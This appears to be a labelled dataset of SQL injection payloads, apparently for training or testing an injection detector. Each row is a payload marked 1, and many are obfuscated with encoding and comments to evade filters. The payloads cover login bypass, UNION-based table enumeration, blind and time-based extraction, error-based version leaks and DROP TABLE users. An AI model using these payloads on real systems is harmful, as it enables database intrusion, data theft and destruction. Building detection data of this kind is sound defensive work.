"test%27||/*%0a*/(1%3D1)%271%27%3D%271%27%0d%0a/*--88wemhemaga", 1
"", 1
"1' AND subs%74ring(d%61tabas%65(), 1, 1) = 's' %2d%2d", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----elmx8ycn10", 1
"admin'%09%09OR%09%09'1'	= '1", 1
"1/**/AND 1=1 OR 'b'='b'", 1
"1AND", 1
"1=1/*%0a*/", 1
"'OR/*%0a*/'1'='1", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 # more_noise----3q7ult96lv4f", 1
"1%27%20UNION%20SEL%45C%54%20table_name%%32C%2%30nu%6c%6c%2C%20%6eull%20FROM%20inform%61tion_schema.tables%20-%2d", 1
";%20DR%4fP TABLE use%72s; --", 1
";/**/DrOP/**/table/**/users;/**//**/oR/**/'b'='B'--", 1
"WAIT%46OR%%320DELAY%2%30%270:0:5%27--", 1
"' && 1=1  XOR (1)--", 1
"%3B%25u0020SEL%2F%2A%21%2A%2FECT%25u0020pg_sleep%285%29%3B%25u0020--", 1
"1)%20UNION%20SELECT%201,database(),3--#zh0udmuqk4e0g4", 1
"1' || (1=1)ascii(substring(database(), 1, 1)) > 100 --", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27 # more_noise--", 1
"'/**/||/**/EXISTs(Sel/*!12345*/EcT/**/1/**/fROM/**/uSERs)--", 1
"1%29%20UNION%20SEL%45C%54%%3201%2C%64at%61base%28%29%2C3%20--%20r%61ndom_noise--", 1
"'    AND    1%09=%201    --", 1
"%2527%2520Or%25201%253d1%2520--%2520", 1
"'/*!12345*/anD      1  =  ConVerT(Int,@@verSIon)--", 1
"%27%20OR%20%271%27%3D%271 /*!*/AND 1=1", 1
"'/**/XOR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1'/**//**//**//**//**//**//**//**/UNION/**//**//**//**//**//**//**//**/SELECT/**//**//**//**//**//**//**//**/table_name,/**//**//**//**//**//**//**//**/null,/**//**//**//**//**//**//**//**/null/**//**//**//**//**//**//**//**/FROM/**//**//**//**//**//**//**//**/information_schema.tables/**//**//**//**//**//**//**//**/--", 1
"%27%20OR%20%2%371%27%3D%%3271", 1
"1' && (1=1)substring(database(), 1, 1) LIKE 's' ----nqtiy2kugbsr", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100  /*!*/AND 1>=1--", 1
"'/**/OR EXISTS(SELECT 1 FROM users) /*!*/AND 1=1--", 1
"1))/**/U%4eION SELECT 1,%64at%61base%28),3--", 1
"1))/**/UNIONSELECT", 1
"1,database(),3--%0d%0a", 1
"test' OR '1'='1'  -- random_noise--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 /*!*/AND 1=1--", 1
"%u0027%u0020AND%u0020%65xtract%76alue(1,con%63%61t(0x5%63,version()))%2d-", 1
"%27/*!*/AND%20extractvalue(1,concat(0x5c,version()))--", 1
"1%u0027%u0020OR%u0020a%73c%69%69(substring(database(),%u00201%2c%u00201)%29%u0020>%u0020100%20%u0020OR%u0020(1)--", 1
"%u0027/*!*/AND%u00201=convert(int,@@version)--", 1
"Test%27%20oR%20%271%27%3d%271%27%20--%20", 1
"%3B%20seLECt%20pg_SLEep%285%29%253b%20----%256Dv%2533%2573gQyt4xz", 1
"%u0027/*!*/aND%u00201<=CoNVErT(iNt,@@veRsiON)--", 1
"Admin%27%20oR%20%271%27%3E%3D%271--zxg0qy", 1
"1))/*!12345*/UNIONSELECT%0d%0a1,database(),3 OR 'b'='b'--#2af6qybinho/*%0a*/", 1
"teSt'%0AOR'1'	='1'/*/*%0a*/aNd'a'	='a'", 1
"'AND%0aEXTraCtVaLuE(1,ConcAT(0X5C,VErsioN()))--/*%0a*/", 1
"test'OR", 1
"'1'%09=%20'1'/*%0a", 1
"'UNION%0d%0aSELECT1,2,3--#y65n9i8dg35/*%0d%0a*/", 1
"1%27%2f**%2fA%4eD/**/%73ubstring(d%61tabase(),/**/1,/**/1)/**/=/%2a*/%u0027s%u0027/**/----pm67tbfaq", 1
"1'/*!*/OR/**/IF(substring(database(),/**/1,/**/1)<='a',/**/SLEEP(5),/**/0)/**/--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users) AND 'a'='a'--", 1
"1'			A/*!*/ND			substring(database(),			1,			1)				=%20			's'						/*!*/AND			1	=%201----ocalq1r57", 1
"%3B%2520S%2545LECT%2520pg_s%256c%2565ep%285%29%3B%2520--%23q2vxfx4z2kf", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--%233qc68axb1", 1
"1%29%29%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%201%2Cdatabase%28%29%2C3--", 1
"Admin' oR '1'='1", 1
"TeSt'Or%0D%0A'1'='1'--", 1
"1%27%20XOR%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"test' OR '1'LIKE'1'  /*!*/AND 1=1--", 1
"%2%37%20U%4eION%20SELECT%20n%75ll%2C%20null%2C%20nu%6cl%%320--%20--csnwdlfayh7e6", 1
"'AND/*%0a*/1=convert(int,@@version)AND'a'='a'--", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--", 1
"", 1
"WAITFOR/*!12345*/DELAY/**/'0:0:5'----y022uktcltzq", 1
"%27/**/%4fR/**/'1'='1", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----gi91yhm04n5j2i", 1
"'OR1=1--%0a--o6kwit1", 1
"1)/*!%3123%345*/UNION/**/SELECT/**/1%2cdataba%73e%28),3--", 1
"%27AND/*%0d%%30a*/%31=convert(int,%40@ve%72sion)--%0d%0a", 1
";%20%20%20DROP%20%20%20TABLE%20%20%20users;%20%20%20--#d0pjp", 1
"1'/*!12345*/OR ascii(substring(database(), 1, 1)) > 100 --", 1
"1'XORsubstring(database(),1,/*%0a*/1)", 1
"='s'OR'b'='b'--", 1
"1'%20XO%52 IF(substring(database(), 1, %31%29='a', SL%45EP%285), 0) --", 1
"1)/**/UNION SELECT 1,database(),3--#h64d150if", 1
"1' oR AsciI(SubSTRi%6eg(dAT%41bAsE(), 1,%201)) >%201%300 --", 1
";SEL/**/ECTpg_sleep(5);%0d%0a--%0d%0a#ns572d", 1
"WAITFO/*!12345*/RDELAY%0d%0a'0:0:5'--/*%0d%0a*/", 1
"%3B%20SeLECT%20pG_SLEeP%285%29%3B%20%20OR%20%27b%27%3D%27b%27--", 1
"%27%2F%2A%2A%2F%20%20%20%20%20%20%20AND%20%20%20%20%20%20%20%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"'/*!*/UnIonselECt%0d%0A1,2,3--/*%0a*/", 1
"%27%2F%2A%2A%2FOR%201IN%20%281%291%20--%20", 1
";%u0020DrOP%u0020TAblE%U0020users;%u0020--", 1
"'/*!*/UnioN/**/SeLECt/**/NUlL,/**/nulL,/**/NulL/**/--/**/", 1
";%20%20%20%20DROP%20%20%20%20TABLE%20%20%20%20users;%20%20%20%20----qlns1xe", 1
"'uNiO%4EseL%45ct1,%32,3--/*%0d%0a*/", 1
"%27%2F%2A%2A%2FXOR%2F%2A%2A%2F%271%27%3D%271", 1
"' XOR extractv%61lue(%31,conc%61t(0x5c,version%28)))-%2d", 1
"'OREXISTS(SELECT%0d%0a1FROMusers)--", 1
"'UnIoNSeLeCtNulL,%0aNUlL,%0AnUll----NqYy9xsmzvL/*%0D%0A*/", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27--%23utgajmga5wz", 1
"1%27%20O/*!12345*/R%20IF(substring(database(),%201,%201)%09%3D%20%27a%27,%20SLEEP(5),%200)%20--", 1
"1%u00%327%u0020UNION%u0020sE%4cEC%74%u0020TablE_NAME,%u0020NULl,%u0020nULl%u0020f%52om%u0020i%6efoRMaTiOn%5f%73cHeMA.T%41blEs%%7500%320%2d-", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20OR%20%281%29--%231a2nwc", 1
"1AND%0d%0a1=1%0a", 1
"admin'     OR     '1'  =%20'1", 1
"Wa%49tFor%u0020DeLa%59%u0020%u00270:0%3A5%u0027--", 1
"'UN/**/ION%0aSELECTnull,null,null--#awsmp53qn", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  -- random_noise--", 1
"' OR '1'='1--41uonp", 1
"teSt'/*!12345*/OR '1'	= '1' --", 1
"'OR%0a1=1", 1
"/*!12345*//*!*/AND 1=1--%0d%0a#ljwhyjb0", 1
"test' oR '1'='1' --", 1
"' OR 1=1 -- --ng4rn3mw", 1
"%27%20A/*!*/ND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#0nu0mhnjtwm", 1
"'				UNION				SELECT				1,2,3--", 1
"' O%52 EXI%53TS%28SELECT 1 FRO%4d users) # mor%65_noise--", 1
"1'O/**/R%0d%0aascii(substring(database(),1,1))>%0a100--%0a", 1
"'/**/AND/*%2a/1=1/**/-%2d/**%2f", 1
";Sel/**/ECt%0ApG_SLeEP(5);/*%0a*/--/*%0A*/", 1
"WA%49TFOR %44ELAY '0:0:5'--#b2%7ari1a5%66kgf", 1
"%u002%37%u0%302%30OR%u0020%u00271%u002%37=%u00271", 1
"%2527%2520and%2520extRactVALuE%281%2CCONcat%280x5c%2CVersion%28%29%29%29--", 1
";/%2a*/DROP TABL%45 users;%20--", 1
"' && (1=1)1=convert(int,@@version)----l332uo67xg9lu", 1
"'OR%0d%0a1/**/=/**//**/1", 1
"%09%09%09%09AND%09%09%09%09'a'/**/=/**//**/'a'--/*%0a*/", 1
"'/**/aND/**/EXtracTvALuE(1,COnCat(0X5c,vErSION()))--", 1
"' OR 1=1 -- #zedwjlv3ummwuol", 1
"aDmin' Or '1'='1--4swgg5j", 1
"%27%u0020OR%20EXISTS(SEL/*!12345*/ECT%u00201%20FR%4fM%u0020users)--", 1
"%27%20OR%20EXISTS%28SElecT%201%20FRoM%20USErs%29--", 1
"'/**/AND/**/1=convert(int,@@version)----eifhhvvs29wvwq0", 1
"%27%09%09AND%09%09extractvalue(1,concat(0x5c,version()))--#rvi7w8l7egz6", 1
"%57a%49tFOr%u0020DeLAy%20%u00270:0:5%u0027--", 1
"1'O/*!12345*/Rascii(substring(database(),1,/*%0d%0a*/1))/*%0a*/>100--", 1
"1%U0027%U0020unIon%u0020sELeCt%u0020tABlE_namE,%U0020nulL,%u0020null%u0020FrOm%U0020InforMaTiON_ScHEMA.tables%u0020--", 1
"%27/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)/**/AND/**/%27a%27%3D%27a%27--", 1
"' AND 1%4cIKEc%6fnvert(in%74,@@versi%6fn)--", 1
"test%u0027					OR					%u00271%u0027%u0020%3D	%u00271%u0027					/*					/*!*/AND					1%u0020%3D	1", 1
"%3B%20SEL/*!*/ECT%20pg_sleep%285%29%3B%20--#hr36wehze", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----ggrsjgov1oamwsl", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3--#g4k01xzzkm2v", 1
";/**/SELECT/**/pg_sleep(5);/**/--#41uix", 1
"1'			%09	OR					I%46(substring(d%61tab%61se(),%09				1,%09%09			1)%09%3d	'a',					SLEEP(5),					0)			%09	--", 1
"1' OR%20IF%28substring(database%28), 1, 1)='a'%2c SLEEP(5), 0%29 %2d-", 1
"; DROP TABLE users; ----g1aimeomuns", 1
"1' Or ascii(SUBSTRING(dAtAbAsE(), 1, 1)) > 100 --", 1
";DRO%50/*%0d%0a*/T%41BLE/*%0a*/user%73;--%0a", 1
"1'/**/||/**/(1=1)aScii(sUBsTRinG(DAtabAse(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'UNIONSELECTnull,/*%0d%0a*/null,null--", 1
"", 1
"'/**//**//**//**/UNION/**//**//**//**/SELECT/**//**//**//**/null,/**//**//**//**/null,/**//**//**//**/null/**//**//**//**/--/**//**//**//**/", 1
"WAITFOR%20DELAY%20%270:0:5%27%20OR%20(1)--", 1
"teSt'%20%4FR '1'='1' -%2d", 1
"'/**/O%52/**/EX%49STS(SELECT/%2a%2a/1/**/FROM/**/users)%2d- # more_noise", 1
"%3B%20DrOP%20tablE%20usERs%3B%20--", 1
"admin'OR'1'<='1%0a#epdkg4erfbc", 1
"; SELECT pg_sleep(%35);%20%2d-", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20%23%20more_noise----27f34f02abrx", 1
"%3BSELECT%2F%2A%250d%250a%2A%2Fpg_sleep%285%29%3B%250d%250a OR 'b'='b'--%0A", 1
"1'UNIONSELECT%0d%0atable_name,null,nullFROMinformation_schema.tables----ru0yuo7p1v0ix", 1
"1%27ORascii%28substring%28database%28%29%2C%2F%2A%250d%250a%2A%2F1%2C1%29%29%3E100--", 1
"; DROP TABLE users; ----77dcqhqz6rvszd", 1
"1))/*!12345*/   UNION    SELECT    1,database(),3--", 1
"1'ORIF(substring(database(),%0a1,1)>='a',%0d%0aSLEEP(5),0)--random_noise--", 1
";%u0020DROP%u0020TABLE%u0%3020users;%u0020 /*%21%2a/A%4eD 1%3d%31--", 1
"%2561dmin%27%20OR%20%271%2527%3D%271", 1
"1%27%20OR%20asci%69%28substring%28databas%65%28%2%39%2C%20%31%2C%2%301%29%29%2%30%3E%201%300%20--", 1
"'OREXISTS(SELECT1%0d%0aFROM/*%0d%0a*/users)AND%0a'a'='a'--", 1
"'/**/AND/**/1=1/**/ /*!*/AND 1=1--/**/", 1
"'%2f**/OR 1%3d1 -- #e731ig7vaj", 1
"%25u0027%25u0020%26%26%25u00201%3Dconvert%28int%2C%40%40version%29--", 1
"1%u0027%u0020UNION%u%30020S%45%4cECT%u0020table%5fname,%u00%320null,%u0020null%u0%30%320FROM%u0020in%66ormat%69on%5fschema.tables%%750020--", 1
"%27%20%20%20OR%20%20%201%09%3D%25201%20%20%20%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--%20%20%20", 1
"%27anD%250a1%3DCONVERT%28Int%2C%40%40versIOn%29--%0A#aksu23", 1
"admin'OR'1'='1/*%0d%0a*/", 1
";%20DRop%20TAbLE%20usERS;%20--", 1
"%27%20%2541ND%201%3D1%20%252d-%20%23j74shv13", 1
";%44R%4fP/*%0d%0a*/TABLE%20users;--/*%0d%0a*/", 1
"' XOR 1>=convert(int,@@version)--", 1
"'/**/UNION					SELECT					1,2,3					OR					(1)--", 1
"%27/**/Or%201%3D1%20--%20--ypc3jegv56gvayw", 1
"'%20OR '1'%3d'1", 1
";DROP%0aTABLEusers;--#p394ucm", 1
"1%27%20XOR%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"test'OR%0a'1'='%31%27%0a/*", 1
"", 1
"test%27/*!*/OR%271%27%3D%271%27%0a/*--9jh14wxb", 1
"admin'%09%09OR%09%09'1'%20=	'1", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----csl5x9hohc591xv", 1
"test'OR'1'='1'--", 1
"--97xq8j89", 1
"; sELEct Pg_SLeEP(5); --#sj42QGyb76Jy", 1
"tes%74%27%20OR%20%%3271%27%3D%271%27%20/%2a", 1
"1%27%2F%2A%2A%2FAND%2F%2A%2A%2Fsubstring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%2520%3D%2509%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--", 1
"1'UNIONSELE%43T/*%0d%0a*/tabl%65_%6eame,null%2c%0d%0anullFROMinform%61tion_schema.table%73%2d-%0%61", 1
"%27 %41N%44 1=convert(int,@@versi%6fn)--", 1
"%u0027/**/UNION/**/SELECT/**/1,2,3 /*!*/AND 1=1--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 # more_noise----2s2j2gilx", 1
";DROP", 1
"TABLE%0ausers;/*%0a*/--", 1
"%u0027%u0020AND%u00201%3D1%u0020--%u0020", 1
"'OR/*%0a*/EXISTS(SEL/*!12345*/ECT1%0aFROMusers)--/*%0a*/", 1
"%27%20UNion%20seLECt%20nUll,%20NUlL,%20NULL%20--%20", 1
"admin%u0027%u0020OR%u0020%u00271%u0027>=%u00271 -- random_noise#j6haavn9cler", 1
"1 %41ND 1=1#nv802iqcawh9i85", 1
"'/*!*/UniON SeLeCT nUlL, nuLl, null --", 1
"' XOR '1'LIKE'1", 1
"'/**/ANd/**/1%09= 1/**/--/**/", 1
"1)%u0020UNION%u0020S%45LE%43%54%u00201,%64ataba%73e(),3 OR (1)--", 1
"'/*!*/AND      extractvalue(1,concat(0x5c,version()))--", 1
"'Or1=1%0A--/*%0A*/", 1
"'AND1=convert(int,@@version)--", 1
"", 1
"' AND 1=1 -- #grd6he5p", 1
"'/**/xo/*!*/r/**/1=1/**/--/**/", 1
"1%29%%32509%2509UNION%2509%2509S%45LECT%2509%2509%31%2Cdat%61bas%65%2%38%29%2C3 # more_noise--", 1
"1%29%29UNIONSELECT1%2Cdatabase%28%29%2C3OR%2F%2A%250d%250a%2A%2F%281%29--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%09%3D%09%20%27s%27%20--", 1
"1%27/**/ANd/**/sUbStrIng%28Da%74a%62as%65%28),/**/1,/**/1)/**/%3D/**/%27s%27/**/--", 1
"1'UN/*!12345*/IONSELECT", 1
"table_name,null,%0anullFROMinformation_schema.tables # more_noise--", 1
"%27%20UNION%20%53ELEC%54%201,2,%33%20AND%20%27a%27%3D%27a%27--", 1
";%20%20%20%20SELECT%20%20%20%20pg_sleep(5);%20%20%20%20--", 1
"1)/*!*/unIon%20%20%20%20seLecT%20%20%20%201,dAtabASe(),3--", 1
"admin'/**/OR/**/'1'<='1 /*!*/AND 1=1", 1
"%3B%20DROP%20TABLE%20users%3B%20%20--%20random_noise--", 1
"ADmIN%27%20Or%20%271%27%3D%271", 1
";%20DROP%20TABLE%20users;%20----q3ad0in5074o", 1
"%31'%20uN%69ON SELecT TABLE_nAmE, nUll, nu%4cL From%20INfoRmatIo%4e_sch%65%4dA.TABlEs --", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)IN (1)'a',/**/SLEEP(5),/**/0)/**/--", 1
"Test%27%20or%20%271%27%3D%271%27%20--%20", 1
"%u0027%u0020OR%u0020EXI%53TS(%53ELECT%u00201%u0020FROM%u0020use%72%73)--", 1
"1'%2f*!*/%4Fr%20%20%20If(SubStRin%67(DAtABAse(),%20%20%201,%20%20%201)  =  '%61',%20%20%20SLe%45P(5%29,%200)%20%20%20--", 1
"admin'/**/XOR/**/'1'='1 # more_noise", 1
"' UNION SELECT null, null, null -- #laiyghb0f9a", 1
"test' OR '1'='1' /*#qx6kqqxcf0", 1
"'/*!*/OR%20%201%20=/**/1%20%20--%20%20", 1
";SEL/**/ECtpg_SLeep(5);/*%0d%0a*/--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20%2F%2A%21%2A%2FAND%201%3D1----gtsq5wqopm", 1
"' UNION SELECT null, null, null -- #otjzi", 1
"%3B%25u0020SELECT%25u0020pg_sleep%285%29%3B%25u0020--", 1
"ADmIN%u0027%u0020OR%u0020%u0027%31%u0027%3d%u00271-%2dTZz04F", 1
"' AND 1=convert(int,@@version)--#1slpctteon", 1
"'%09%09An%44%09%09%31%20=/*!12345*/CON%76ErT(inT,@@V%65RsioN)--", 1
"%27%2F%2A%2112345%2A%2FOR%2520EXI%2553TS%2528SELECT%201%20FROM%20u%2573e%2572s%29--", 1
"1%2F%2A%2112345%2A%2FAND%201%3D1", 1
"' OR '1'='1#gp6yyugz56fjcfv", 1
"1%20%20%20%20%41ND%20%20%20%201%u0020%u0020=%091#%33pibkse0mlff%36", 1
"; dROp tABlE UsERS; --", 1
"%u0027%u0020O/*!*/R%u0020%u00271%u0027%3D%u00271", 1
"1%20AND/**/1>=1 # more_noise", 1
"1)/*!*/UNIONSELECT1,database(),3--", 1
"", 1
"WAitFOR%20DElAy%20%270:0:5%27--", 1
"t%65st%27%20%4fR%20%271%27%3D%271%27%20--%20#9csln1cqqnedt", 1
"admin'OR'1'='1/*%0a*/", 1
"'/**/       unioN        select        NULl,        NUlL,        NULL        --", 1
"'/**/OR/**/EXISTS(SEL/**/ECT/**/1/**/FROM/**/users)--#qant2npbzq", 1
"'/*!12345*/UNIONSELECTnull,null,/*%0d%0a*/null--#1k0t9im32if8hf0", 1
"test%27%20OR%20%271%27%3c%3D%271%27%20/*", 1
"'   UNION   SELECT   null,   null,   null   --   #xih9p3c11r2ae5", 1
"1%27%2509%2509%2509%2509OR%2509%2509%2509%2509IF%28substring%28database%28%29%2C%2509%2509%2509%25091%2C%2509%2509%2509%25091%29%09%3D%20%27a%27%2C%2509%2509%2509%2509SLEEP%285%29%2C%2509%2509%2509%25090%29%2509%2509%2509%2509%20AND%20%27a%27%3D%27a%27--%23m155vqa27jkk99l", 1
"'/*!*/UNION SELECT null, null, null  OR 'b'='b'--", 1
"' OR '1'<='1--1gffv9eitr", 1
"'UNION/*%0d%0a*/SELECT/*%0d%0a*/1,2,3--%0a", 1
"1", 1
"A/*!12345*/nD1/*%0D%0A*/=%201", 1
"", 1
"1%u0020aND%u00201=1", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20 # more_noise--%20", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--#6r0iz0j8535uz4", 1
"1)) UNION SELECT 1,database(),3--#eu9v3kj975a", 1
"%31'/**/UNION/**/SELE%43T/**%2ftable_name%2c/**/null,/**/nul%6c/**/FRO%4d%2f**/informat%69%6fn_schem%61.tables/**/--", 1
"WA%49TFO%52 DEL%41Y '0:0:5'--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  OR 'b'='b'--", 1
"TeST%27%20Or%20%271%27%3d%271%27%20%20--%20RAndOM_nOIsE--%20", 1
"1%u0020%u0020AND%u0020%u00201%09=%u00201", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020----5vg6xam04", 1
"1)%20uNION%20SELECT%201,DatAbase(),3--#fC4uIb", 1
"test' OR '1'>='1' /*", 1
"'/*!12345*/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"1%2F*!*/and%201=1", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#lc2ezrfk", 1
"%27%20AND%201%3D1%20--%20%232aeg1o8vz", 1
"'or/*%0d%0a*/'1'IN%0d%0a(1)'1%0a", 1
";/**//**/SELECT/**//**/pg_sleep(5);/**//**/--", 1
"1%U0027%u0020oR%U0020aScii(subSTRing(DATABase(),%U00201,%U00201))%u0020>%U0020100%U0020 /*!*/And 1=1--", 1
"1%29%20uniON%20sElEcT%201%2cdATAbASE%28%29%2c3--", 1
"'          OR          1 =%201                    --          random_noise--", 1
"%27/*!12345*/UNION%20SELECT%201,2,3----km9lqdi6qv3wsu", 1
"1' Or iF(sUBstRIng(datAbaSE(), 1, 1)>='A', sLEEP(5), 0) --", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027 # more_noise--#xa7u8zn7b3tr", 1
";DroPtAbLEuSERs;--#sq5fca192/*%0d%0a*/", 1
"%3B%20selECt%20PG_SlEEp%285%29%3B%20--", 1
"' && 1<=1 -- --5bm2r4qbxgi055p", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%09=%20%u00271/**/AND/**/'a'%09=%20'a'", 1
"te%73%74'      XOR      '1'%20>= '1'      /*", 1
"1'UNIONSELECTtable_name,", 1
"null,nullFROMinformation_schema.tables--", 1
"WAITFOR DELAY '0:0:5'--#udglz57", 1
"1%2529%29%25u0%253020UN%2F%2A%2112345%2A%2FION%25u0020SEL%2545%2543%2554%25u00201%2Cdatabase%28%29%2C3--", 1
"%27%0%39%09UNION%09%%30%39SELECT%09%091,2,3%2d-", 1
"admin%27%20OR%%320%271%%327%%33D%271", 1
"%3B%2509%2509DROP%2509%2509TABLE%2509%2509users%3B%2509%2509--", 1
"' UNION SELECT null, null, null -- --buthw", 1
"1%u0027/*!*/OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1%2527%2520OR%2520AsCII%28SubstriNG%28DaTabase%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"tEST'%20%20%20%20||%20%20%20%20(1 lIke 1)'1' = '1'%20%20%20%20/*", 1
"%3B%20dROP%20tabLe%20users%3b%20--", 1
"1%27%20%7c%7C%20%281%3d1%29If%28SUbSTRING%28daTabasE%28%29%2C%201%2C%201%29%3D%27A%27%2c%20SLeeP%285%29%2c%200%29%20--#H84OkU84X5", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020 AND 'a'<='a'--%u0020", 1
"1%27%09%09%09%09or%09%09%09%09if(SubString(DATabAse(),%09%09%09%091,%09%09%09%091)%20%20%3D%09%27A%27,%09%09%09%09SlEep(5),%09%09%09%090)%09%09%09%09----5QMlQMc4", 1
"%27AND/*%0a*/1%3Dconvert(int,@@version)--%0a", 1
"1%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3--", 1
"1'OR%0d%0aIF(substring(database(),/*%0a*/1,1)='a',SLEEP(5),0)/*%0a*/--", 1
"' OR '1'='1#c25qd2orxkn2d", 1
"1%27/**/UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"1)/*!12345*/UNION/**/SELECT/**/1,database(),3----7k1xsgnf8wr91", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29%20%23%20more_noise--", 1
"%27%20OR%20%271%27%3D%271--iq86s6c", 1
"1' UNIoN sElect tABLE_name, NUlL, NULl FrOm inFoRMatION_sChemA.TablEs --", 1
"test' O%52 '1'='1' %2f*%20AND %27a'='a'", 1
"test%25u0027%2F%2A%2A%2FOR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020--%25u0020", 1
"'/**/%4fR/**/EXISTS(SEL%45C%54/**/1/**/FROM/**/%75sers)--", 1
";/**/SELECT/**/pg_sleep(5);/**/----fu1gl0ggpdtlcqs", 1
"1'OR/*%0a*/IF(substring(database(),1,1)='a',SLEEP(5),0)--%0a", 1
"%27%20%55%4eION%20SELE%43T%20null,%20null,%20nu%6cl%20--%20--ccnpy%6385sukaps", 1
"1' OR IF(substring(database%28), 1%2c %31)='a', %53%4cEEP(5), 0) %2d-#c9uae8kyplq3", 1
";/**/SEL/*!*/ECT/**/pg_sleep(5);/**/--", 1
"test%27OR%271%27%3D%271%27%2F%2A%250d%250a%2A%2F%2F%2A%250d%250a", 1
"%3B%2F%2A%21%2A%2FSELECT%20pg_sleep%285%29%3B%20--", 1
";%20%20%20%20selECT%20%20%20%20%70%67_sle%65p(5);%20%20%20%20--", 1
"; DROP TABLE users;  AND 'a'='a'--", 1
"tEST'%20Or%20'1'	= '1'%20 oR (1)--%20--b2n6w3", 1
"Admin%27%20OR%20%271%27%3d%271", 1
"%u0027%u0020OR%u00201%3d1%u0020-%2d%u0020 # more_noise", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#ute70c3rt0x", 1
"1)UNION", 1
"SELECT/*%0a*/1,database(),3 -- random_noise--%0a--dioui", 1
"%31%27/*%2a/UNION/**/SELECT/**/table_name,%2f**/null,%2f**/nul%6c/**/FROM/**%2fi%6ef%6frmation%5fschema.tables/**/--", 1
"1%29%2520U%254e%2549ON%20SELECT%201%2C%2564atabase%28%29%2C3%20%23%20more_noise--", 1
"%27%20AND%20%65xtractvalue(1,c%6f%6ecat(0x5c,version()))%2d%2d", 1
"1)UNION/*%0d%0a*/SELECT1,database(),3--/*%0d%0a*/--z1f3hgjibz69", 1
"%u0027/**/AND%u00201	=  1%u0020--%u0020", 1
"1'OR%0aascii(substring(database(),1,1))>100%0a--#v6y6j", 1
"%31)%20U%4e%49ON%20SELECT%20%31,database(),3 -- random_noise--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027----dq71ulsm6h7", 1
"test' OR '1'='1'  # more_noise--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3C%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"; %44ROP%20TABLE users; %2d-", 1
"1%u0027%u0020UN/**/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020%u0020--%u0020random_noise--", 1
"%25u0027%25u0020OR%25u00201%3C%3D1%25u0020--%25u0020", 1
"wAitFoR%2509%2509%2509%2509%2509DELay%2509%2509%2509%2509%2509%270%3A0%3A5%27--", 1
"' OR '1'%3d'%31", 1
"1%41ND1=%31/*%0a*/--3af3%61oa", 1
"'OR1=1%0d%0a--", 1
"TeST'/*!12345*/or '1'='1'  # more_noise-- #Y0k4Fa4Kiqtcs3l", 1
"tEST'  or  '1'%09=  '1'  --", 1
"1'%09%09%09U%4eION%09%0%39%09SELEC%54%09%%309%09tabl%65_n%61me,%09%09%09nul%6c%2c%0%39%%309%09n%75ll%09%09%09FROM%09%09%09inform%61tion_schema.%74ables%09%09%09----3cnbda8", 1
"%27%2F%2A%2A%2FOR%20%271%27%3D%271", 1
"1 AND 1=1 -- random_noise", 1
